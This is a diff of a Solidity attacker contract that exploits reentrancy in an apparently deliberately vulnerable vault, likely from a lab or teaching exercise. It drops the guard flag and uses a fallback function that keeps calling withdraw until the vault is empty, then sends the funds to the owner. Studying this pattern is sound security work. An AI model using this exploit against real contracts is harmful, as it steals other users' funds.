@@ -6,27 +6,29 @@ import "./VulnerableVault.sol";
 contract Attacker {
     VulnerableVault public vault;
     address public owner;
-    bool public attacking;
+
+    event Reentered(uint256 vaultBalance);
 
     constructor(VulnerableVault _vault) {
         vault = _vault;
         owner = msg.sender;
     }
 
-    // Seed initial balance
+    // Seed initial balance into the vault under this contract's address
     function depositToVault() external payable {
         vault.deposit{value: msg.value}();
     }
 
     function attack() external {
-        attacking = true;
         vault.withdraw();
-        attacking = false;
+        // sweep after the loop completes
         payable(owner).transfer(address(this).balance);
     }
 
-    receive() external payable {
-        if (attacking && address(vault).balance > 0) {
+    // Fallback handles plain ETH because no receive() is declared
+    fallback() external payable {
+        if (address(vault).balance > 0) {
+            emit Reentered(address(vault).balance);
             vault.withdraw();
         }
     }
